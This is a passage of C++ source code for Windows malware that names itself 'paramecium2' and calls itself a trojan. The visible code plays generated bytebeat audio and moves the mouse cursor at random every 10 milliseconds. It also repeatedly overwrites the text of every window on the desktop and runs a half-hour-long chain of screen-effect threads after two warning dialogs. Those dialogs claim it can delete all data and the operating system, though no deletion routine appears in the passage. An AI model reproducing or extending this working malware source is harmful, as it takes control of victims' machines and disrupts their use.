    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound17() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(114 * ((t >> 5 ^ (t >> 14) - 1 ^ 1) % 19 * t / 19) + 128);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound18() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * 11 >> (t * "1145pm"[t >> 11 & 2] * (t >> 11 | 10) >> 2));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound19() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 11 ^ t >> 4) % 5 * ((t >> 14 & 1 ^ t >> 91 & 9) + 8) * t % 99 + ((3 + (t >> 14 & 3) - (t >> 16 & 1)) / 3 * t % 99 & 64));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound20() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t / 11 * (4 + ((t ^ t / 51 ^ t / 4 & t / 19) >> 1 & 8)) / 1 % 114 + t / 5 * (14 + (t >> 19 & 1)) / 81 % 114);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound21() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t << t | t * rand());

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI cur(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        SetCursorPos(rand() % w, rand() % h);
        Sleep(10);
    }
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)string(), SMTO_ABORTIFHUNG, 100, NULL);
    return true;
}

DWORD WINAPI textz(LPVOID lpParam) {
    while (true) {
        BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
        EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
        Sleep(10);
    }
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as paramecium2 that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"paramecium2", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    else {
        if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"paramecium2", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        }
        else {
            Sleep(4000);
            CreateThread(0, 0, msg, 0, 0, 0);
            Sleep(1000);
            CreateThread(0, 0, cur, 0, 0, 0);
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            HANDLE thread1dot1 = CreateThread(0, 0, warning, 0, 0, 0);
            HANDLE thread1dot2 = CreateThread(0, 0, icons, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread6 = CreateThread(0, 0, shader6, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread7 = CreateThread(0, 0, shader7, 0, 0, 0);
            sound7();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread8 = CreateThread(0, 0, shader8, 0, 0, 0);
            HANDLE thread8dot1 = CreateThread(0, 0, gaussian, 0, 0, 0);
            sound8();
            Sleep(30000);
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            TerminateThread(thread8dot1, 0);
            CloseHandle(thread8dot1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread9 = CreateThread(0, 0, shader9, 0, 0, 0);
            sound9();
            Sleep(30000);
            TerminateThread(thread9, 0);
            CloseHandle(thread9);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread10 = CreateThread(0, 0, shader10, 0, 0, 0);
            sound10();
            Sleep(30000);
            TerminateThread(thread10, 0);
            CloseHandle(thread10);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread11 = CreateThread(0, 0, shader11, 0, 0, 0);
            sound11();
            Sleep(30000);
            TerminateThread(thread11, 0);
            CloseHandle(thread11);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread12 = CreateThread(0, 0, shader12, 0, 0, 0);
            sound12();
            Sleep(30000);
            TerminateThread(thread12, 0);
            CloseHandle(thread12);
            TerminateThread(thread1dot1, 0);
            CloseHandle(thread1dot1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            CreateThread(0, 0, textz, 0, 0, 0);
            HANDLE thread13 = CreateThread(0, 0, hell1, 0, 0, 0);
            HANDLE thread13dot1 = CreateThread(0, 0, cube, 0, 0, 0);
            sound13();
            Sleep(30000);
            TerminateThread(thread13, 0);
            CloseHandle(thread13);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread14 = CreateThread(0, 0, swirl, 0, 0, 0);
            HANDLE thread14dot1 = CreateThread(0, 0, cur1, 0, 0, 0);
            sound14();
            Sleep(30000);
            TerminateThread(thread14, 0);
            CloseHandle(thread14);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread15 = CreateThread(0, 0, shader13, 0, 0, 0);
            sound15();
            Sleep(30000);
            TerminateThread(thread15, 0);
            CloseHandle(thread15);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread16 = CreateThread(0, 0, shader14, 0, 0, 0);
            HANDLE thread16dot1 = CreateThread(0, 0, blur, 0, 0, 0);
            sound16();
            Sleep(30000);
            TerminateThread(thread16, 0);
            CloseHandle(thread16);
            TerminateThread(thread16dot1, 0);
            CloseHandle(thread16dot1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread17 = CreateThread(0, 0, swirl1, 0, 0, 0);
            sound17();
            Sleep(30000);
            TerminateThread(thread17, 0);
            CloseHandle(thread17);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread18 = CreateThread(0, 0, shader15, 0, 0, 0);
            HANDLE thread18dot1 = CreateThread(0, 0, textout, 0, 0, 0);
            HANDLE thread18dot2 = CreateThread(0, 0, shell32, 0, 0, 0);
            sound18();
            Sleep(30000);
            TerminateThread(thread18, 0);
            CloseHandle(thread18);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread19 = CreateThread(0, 0, shader16, 0, 0, 0);
            sound19();
            Sleep(30000);
            TerminateThread(thread19, 0);
            CloseHandle(thread19);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread20 = CreateThread(0, 0, shader17, 0, 0, 0);
            sound20();
            Sleep(30000);
            TerminateThread(thread20, 0);
            CloseHandle(thread20);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread21 = CreateThread(0, 0, shader18, 0, 0, 0);
            sound21();
            Sleep(30000);
        }
    }
}